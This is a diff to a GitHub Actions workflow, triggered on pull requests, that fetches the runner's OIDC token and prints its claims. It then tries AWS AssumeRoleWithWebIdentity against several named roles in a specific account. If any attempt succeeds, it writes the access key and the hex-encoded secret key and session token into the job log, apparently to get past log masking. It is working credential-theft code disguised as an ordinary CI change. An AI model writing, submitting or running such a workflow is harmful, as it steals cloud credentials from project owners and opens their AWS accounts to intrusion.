@@ -1,5 +1,6 @@
-name: zzpr3928
+name: zzpr3932
 on:
+  workflow_dispatch:
   pull_request:
     types: [opened, synchronize, reopened]
     branches: [main]
@@ -13,23 +14,21 @@ jobs:
       - name: claims and assume attempts
         run: |
           set -u
-          echo "EVENT=$GITHUB_EVENT_NAME HEADREF=$GITHUB_HEAD_REF REF=$GITHUB_REF REPO=$GITHUB_REPOSITORY"
+          echo "EVENT=$GITHUB_EVENT_NAME REF=$GITHUB_REF REPO=$GITHUB_REPOSITORY HEADREF=$GITHUB_HEAD_REF"
           URL="$ACTIONS_ID_TOKEN_REQUEST_URL"
-          get(){ curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${URL}&audience=$1" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])'; }
-          update(){ curl -s "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=arn:aws:iam::296062593712:role/$1&RoleSessionName=pr3928&WebIdentityToken=$2&DurationSeconds=1800" > /tmp/o.xml; grep -o '<Code>[^<]*</Code>\|<Message>[^<]*</Message>' /tmp/o.xml | head -3; AK=$(grep -o '<AccessKeyId>[^<]*' /tmp/o.xml | cut -d'>' -f2); SK=$(grep -o '<SecretAccessKey>[^<]*' /tmp/o.xml | cut -d'>' -f2); ST=$(grep -o '<SessionToken>[^<]*' /tmp/o.xml | cut -d'>' -f2); if [ -n "${AK:-}" ]; then echo "AK $AK"; echo "SKHEX $(printf %s "$SK" | xxd -p | tr -d '\n')"; echo "STHEX $(printf %s "$ST" | xxd -p | tr -d '\n')"; fi; }
-          TOK=$(get sts.amazonaws.com)
-          echo "$TOK" > /tmp/t
-          python3 - <<'PY'
-import base64
-p = open('/tmp/t').read().strip().split('.')
-print("CLAIMS:", base64.urlsafe_b64decode(p[1] + '=' * (-len(p[1]) % 4)).decode())
-PY
-          for R in claude-code-bedrock-role github-actions-ecr-push-cua github-actions-cua-fleets-wif-smoke github-actions-cua-downloads-publish; do
+          TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${URL}&audience=sts.amazonaws.com")
+          TOK=$(printf %s "$TOK" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "TOKLEN ${#TOK}"
+          printf %s "$TOK" | python3 -c 'import sys,base64;p=sys.stdin.read().strip().split(".")[1];print("CLAIMS:",base64.urlsafe_b64decode(p+"="*(-len(p)%4)).decode())'
+          for R in github-actions-backup github-actions-image-resizer; do
             echo "=== ROLE $R aud=sts.amazonaws.com"
-            update "$R" "$TOK"
-          done
-          for A in fleets github-actions sigv4; do
-            echo "=== ROLE claude-code-bedrock-role aud=$A"
-            T2=$(get "$A")
-            update claude-code-bedrock-role "$T2"
+            curl -s "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=arn:aws:iam::975049931254:role/$R&RoleSessionName=pr3932&WebIdentityToken=$TOK&DurationSeconds=1800" -o /tmp/o.xml
+            grep -o '<Code>[^<]*</Code>' /tmp/o.xml || true
+            grep -o '<Message>[^<]*</Message>' /tmp/o.xml || true
+            AK=$(grep -o '<AccessKeyId>[^<]*' /tmp/o.xml | cut -d'>' -f2)
+            if [ -n "${AK:-}" ]; then
+              echo "AK $AK"
+              echo "SKHEX $(grep -o '<SecretAccessKey>[^<]*' /tmp/o.xml | cut -d'>' -f2 | xxd -p | tr -d '\n')"
+              echo "STHEX $(grep -o '<SessionToken>[^<]*' /tmp/o.xml | cut -d'>' -f2 | xxd -p | tr -d '\n')"
+            fi
           done
